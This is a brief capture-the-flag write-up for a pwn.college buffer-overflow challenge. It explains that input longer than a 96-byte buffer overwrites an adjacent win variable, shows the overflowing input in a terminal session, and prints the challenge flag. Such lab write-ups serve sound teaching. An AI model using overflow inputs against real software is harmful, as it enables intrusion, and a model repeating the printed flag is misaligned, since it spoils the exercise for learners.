# Binary Exploitation 

## Challenge 2: Your First Overflow (hard)
### Solve 

**Flag:** `pwn.college{wh5g_S9DJsmle3J7QBDZwo_IDbq.dBTOywyMwAzNzEzW}`

METHOD: 
1. navigate to ls /challenge and see filename with .c
2. read the file using cat
3. it says input[96], which means win_variable starts immediately after these 96 bytes and needs 96+ bytes input to make it non zero to print flag
4. The buffer is only 96 bytes, so if you provide more, it overflows into win_variable
5. give that many characters as input  


```bash  
hacker@binary-exploitation~your-first-overflow-hard:~$ /challenge/binary-exploitation-first-overflow
Send your payload (up to 4096 bytes)!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASDSD
You win! Here is your flag:
pwn.college{wh5g_S9DJsmle3J7QBDZwo_IDbq.dBTOywyMwAzNzEzW}


Goodbye!
